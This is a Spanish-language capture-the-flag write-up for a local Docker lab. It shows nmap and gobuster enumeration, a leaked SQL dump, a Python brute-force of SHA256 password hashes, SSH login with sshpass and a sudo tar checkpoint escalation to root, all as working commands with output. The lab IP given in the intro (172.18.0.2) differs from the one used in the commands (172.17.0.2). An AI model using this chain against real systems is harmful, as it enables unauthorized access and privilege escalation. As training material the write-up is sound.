# Archivo de turnos

> Nodo de archivo de turnos del sector 14. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh`
> `./startlab.sh blackout-pt02.tar`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap. No expongas el contenedor a internet.
>
> **Consejo:** empieza por nmap. El portal de archivo no es el único sitio donde el turno deja material.

**Flag:** `WHOAMI{arch1v0_turn0s}`

---

## Resolución

El consejo ("el portal no es el único sitio donde el turno deja material") indica que hay datos escondidos fuera del index. La cadena: material expuesto → política de claves → SSH → escalada a root con `tar`.

### 1. Levantar el lab y enumerar puertos

**Herramienta:** `nmap`. **Por qué:** el consejo pide empezar por un escaneo completo para ver la superficie real.

**Parámetros:** `-sV` (versión) y `-p-` (todos los puertos).

```bash
$ nmap -sV -p- 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

SSH + HTTP. El portal web no parece tener formularios, así que hay que buscar material oculto.

### 2. Encontrar el material oculto

**Herramienta:** `curl` + `gobuster`. **Por qué:** el reto avisa que hay material fuera del portal; `robots.txt` y el fuzzing de directorios revelan rutas ocultas.

```bash
$ curl -s http://172.17.0.2/robots.txt
User-agent: *
Disallow: /export/

$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
export               (Status: 301)
```

**Lo que vi:** `robots.txt` desvela `/export/`, un directorio con **listado de índice activado** (Apache `Indexes`) que contiene `historico_turnos.sql`.

### 3. Analizar el dump SQL

```bash
$ curl -s http://172.17.0.2/export/historico_turnos.sql
```

El SQL expone una **política de claves** y dos usuarios con su hash:

```sql
-- politica de claves del archivo: Marca + Sitio + sector (sin espacios, sector en dos digitos)
INSERT INTO guardia VALUES ('caja.norte','3441077f4445...','caja');
INSERT INTO guardia VALUES ('iris.historico','c7bd71ae7e9c...','archivo');
```

**Lo que vi:** la política dice `Marca + Sitio + sector`, ej. `Latam` + `Norte` + `14` = `LatamNorte14`. Decisión: verificar contra los hashes SHA256.

### 4. Verificar la clave contra los hashes

**Herramienta:** `python3` + `hashlib`. **Por qué:** comprobar qué combinación de la política genera exactamente el hash del usuario `archivo`.

```python
import hashlib
h2 = 'c7bd71ae7e9c9b42a68857148964bd09ee35c3ff7576bb638a41a53111a7ecee'
for marca in ['LATAM','Latam','latam',...]:
    for sitio in ['Norte','norte','Patio','Archivo',...]:
        if hashlib.sha256(f'{marca}{sitio}14'.encode()).hexdigest() == h2:
            print('MATCH:', marca+str(sitio)+'14')
# → LatamNorte14
```

La clave **`LatamNorte14`** coincide con el hash de `iris.historico` (rol `archivo`).

### 5. Entrar por SSH con la clave derivada

**Herramienta:** `sshpass` + `ssh`. **Por qué:** el usuario `archivo` del dump es el único con shell en el sistema (`iris.historico`); la clave derivada de la política debe abrir SSH.

```bash
$ sshpass -p "LatamNorte14" ssh iris.historico@172.17.0.2 "id"
uid=1000(iris.historico) gid=1000(iris.historico)
```

### 6. Escalar a root con `sudo tar`

**Herramienta:** `sudo -l` + GTFObins. **Por qué:** ver qué puedo ejecutar como privilegiado para escalar.

```bash
$ sudo -l
User iris.historico may run the following commands:
    (root) NOPASSWD: /usr/bin/tar
```

**Lo que vi:** puedo ejecutar `tar` como root sin contraseña. `tar` tiene un checkpoint que ejecuta comandos (`--checkpoint-action=exec`), la vía clásica de GTFObins para spawnear un shell:

```bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 \
    --checkpoint-action=exec="/bin/sh -c 'id > /tmp/who; cat /var/lib/latam/archivo.dat > /tmp/f'"
$ cat /tmp/who
uid=0(root) gid=0(root)
```

### 7. Leer la flag

```bash
$ cat /tmp/f
WHOAMI{arch1v0_turn0s}
```

## Lección

El material de un reto puede vivir fuera del index: `robots.txt` y el listado de directorios destapan lo que el portal no muestra. Y cuando un dump SQL filtra la **política de generación de claves**, esa política permite derivar la credencial real (aquí, contra el SHA256 del usuario). Luego, un sudo sin contraseña sobre `tar` (GTFObins) convierte el acceso en root.